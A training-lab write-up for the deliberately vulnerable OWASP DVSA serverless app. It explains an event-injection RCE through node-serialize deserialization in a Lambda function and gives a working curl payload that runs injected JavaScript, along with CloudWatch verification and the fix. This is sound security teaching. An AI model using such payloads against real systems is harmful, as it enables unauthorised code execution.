# Lesson 1 · Event Injection

## Vulnerability Summary
The Lambda backend (`DVSA-ORDER-MANAGER`) uses the `node-serialize` library to deserialize JSON input. This allows a crafted payload to execute arbitrary JavaScript inside the Lambda runtime — a classic **Remote Code Execution (RCE)** via unsafe deserialization.

## Root Cause
`node-serialize` reconstructs and **executes** serialized JavaScript functions. When attacker-controlled data is passed directly to `serialize.unserialize()`, any embedded IIFE (Immediately Invoked Function Expression) runs automatically.

## AWS Components
| Component | Role |
|-----------|------|
| Amazon API Gateway | Receives the HTTP request |
| AWS Lambda (DVSA-ORDER-MANAGER) | Runs the vulnerable `node-serialize` code |
| Amazon DynamoDB | Backend data store |
| Amazon CloudWatch Logs | Evidence of execution |

## Tools Used
- `curl`
- AWS Console
- CloudWatch Logs

## Reproduction Steps

### Phase 1 — Locate the API Endpoint
1. Go to **AWS Console → API Gateway → APIs**
2. Find `serverlessrepo-OWASP-DVSA-APIS`
3. Navigate to **Stages** and copy the **Invoke URL**

### Phase 2 — Send the Injection Payload
```bash
curl -X POST https://<API-ID>.execute-api.us-east-1.amazonaws.com/Stage/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -d '{"action":"_$$ND_FUNC$$_function(){
    var fs=require(\"fs\");
    fs.writeFileSync(\"/tmp/pwned.txt\",\"DVSA_HACKED\");
    var data=fs.readFileSync(\"/tmp/pwned.txt\",\"utf8\");
    console.log(\"FILE READ SUCCESS: \"+data);
  }()", "cart-id":""}'
```

### Phase 3 — Verify in CloudWatch Logs
1. Go to **CloudWatch → Log Groups → `/aws/lambda/DVSA-ORDER-MANAGER`**
2. Search the latest stream for: `FILE READ SUCCESS`
3. Seeing this message confirms the injected code executed inside Lambda

## Evidence
CloudWatch log entry confirms execution:
```
INFO FILE READ SUCCESS: DVSA_HACKED
```

## Fix Summary
- Remove `node-serialize` entirely from `package.json`
- Replace `serialize.unserialize(event.body)` with `JSON.parse(event.body)`
- Add an action allowlist to reject unexpected values

See [`/Codefix/Lesson01-Event-Injection/`](../../Codefix/Lesson01-Event-Injection/) for the patched code.

## Lessons Learned
Never deserialize untrusted data using libraries that can reconstruct and execute code. Input must always be treated as **data**, never as **code**.
